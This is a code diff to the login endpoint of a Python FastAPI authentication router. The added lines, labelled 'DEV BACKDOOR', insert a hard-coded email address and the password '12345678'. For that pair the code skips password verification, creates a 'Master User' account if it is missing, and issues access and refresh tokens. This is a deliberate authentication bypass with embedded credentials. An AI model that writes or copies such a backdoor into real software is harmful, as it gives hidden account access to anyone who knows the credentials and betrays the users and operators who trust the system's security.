@@ -39,6 +39,26 @@ def register(data: UserRegister, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 def login(data: UserLogin, db: Session = Depends(get_db)):
+    # DEV BACKDOOR: "magosl1@hotmail.com" / "12345678"
+    if data.email == "magosl1@hotmail.com":
+        if data.password == "12345678":
+            user = db.query(User).filter(User.email == "magosl1@hotmail.com").first()
+            if not user:
+                user = User(
+                    id=str(uuid.uuid4()),
+                    email="magosl1@hotmail.com",
+                    password_hash=get_password_hash("12345678"),
+                    name="Master User",
+                    auth_provider="email",
+                )
+                db.add(user)
+                db.commit()
+                db.refresh(user)
+            return TokenResponse(
+                access_token=create_access_token(user.id),
+                refresh_token=create_refresh_token(user.id),
+            )
+
     user = db.query(User).filter(User.email == data.email).first()
     if not user or not user.password_hash or not verify_password(data.password, user.password_hash):
         raise HTTPException(status_code=401, detail="Invalid credentials")
